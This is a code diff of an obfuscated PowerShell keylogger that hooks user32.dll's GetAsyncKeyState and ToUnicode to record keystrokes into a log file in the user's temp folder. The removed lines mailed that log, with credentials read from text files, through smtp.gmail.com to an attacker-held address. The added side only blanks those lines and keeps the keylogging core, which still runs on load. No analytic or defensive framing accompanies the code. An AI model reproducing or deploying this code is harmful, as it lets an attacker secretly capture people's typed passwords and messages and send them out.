@@ -1,11 +1,5 @@
-$quFyNXsVoA = Get-Content XbrMzmCUiE.txt
-$TapErgDsWt = Get-Content UJbMLjTIDr.txt
-
 function JUHknDWprl($faZCHPlAvk="$env:temp/$env:UserName.log") {
-  $mloPSsnNhM = Get-Content "$faZCHPlAvk"
-  $lvTkBDAdhb = "$env:UserName logs"
-  Send-MailMessage -From $quFyNXsVoA -To $quFyNXsVoA -Subject $lvTkBDAdhb -Attachment $faZCHPlAvk -SmtpServer smtp.gmail.com -Port 587 -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $quFyNXsVoA, (ConvertTo-SecureString -String $TapErgDsWt -AsPlainText -Force))
-  $MZhDdoNaqv = New-Item -Path $faZCHPlAvk -ItemType File -Force
+
   $OcWuFHMxqw = @'
 [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
 public static extern short GetAsyncKeyState(int virtualKeyCode);
@@ -36,7 +30,7 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
     }
   }
   finally {
-    Send-MailMessage -From $quFyNXsVoA -To $quFyNXsVoA -Subject $lvTkBDAdhb -Attachment $faZCHPlAvk -SmtpServer smtp.gmail.com -Port 587 -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $quFyNXsVoA, (ConvertTo-SecureString -String $TapErgDsWt -AsPlainText -Force))
+
   }
 }
 JUHknDWprl
